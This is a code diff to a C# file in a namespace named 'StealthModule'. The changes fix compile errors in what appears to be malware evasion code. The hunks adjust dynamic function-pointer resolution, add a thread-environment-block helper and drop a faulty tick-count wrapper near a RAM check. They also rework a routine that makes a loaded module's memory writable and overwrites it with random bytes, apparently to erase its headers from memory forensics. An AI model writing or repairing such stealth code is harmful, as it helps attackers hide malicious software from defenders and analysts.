@@ -215,10 +215,10 @@ namespace StealthModule
                 catch { }
                 return IntPtr.Zero;
             }
-
+            private static IntPtr GetTeb()
+            {
                 return NtCurrentTeb();
-
-            // Removed __readgsqword as it is not valid C#
+            }
 
             private static T GetPInvoke<T>(string module, string function) where T : class
             {
@@ -240,7 +240,7 @@ namespace StealthModule
                         return null;
 
                     var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
-                    _delegateCache[key] = del;
+                    _delegateCache[key] = del as Delegate;
                     return del;
                 }
             }
@@ -1042,13 +1042,6 @@ namespace StealthModule
             return false;
         }
 
-        private static uint GetTickCount64()
-        {
-            if (GetTickCount64 != null)
-                return GetTickCount64();
-            return GetTickCount != null ? GetTickCount() : 0;
-        }
-
         private static long GetTotalRAM()
         {
             try
@@ -1378,12 +1371,14 @@ namespace StealthModule
                 byte[] junk = new byte[0x1000];
                 _cryptoRand.NextBytes(junk);
                 
-                NtProtectVirtualMemory(GetCurrentProcess(), ref hMod, ref junk.Length, 
+                IntPtr pBase = hMod;
+                uint sz = (uint)junk.Length;
+                NtProtectVirtualMemory(GetCurrentProcess(), ref pBase, ref sz, 
                     PAGE_EXECUTE_READWRITE, out old);
                     
                 Marshal.Copy(junk, 0, hMod, junk.Length);
                 
-                NtProtectVirtualMemory(GetCurrentProcess(), ref hMod, ref junk.Length, 
+                NtProtectVirtualMemory(GetCurrentProcess(), ref pBase, ref sz, 
                     old, out old);
             }
             catch { }
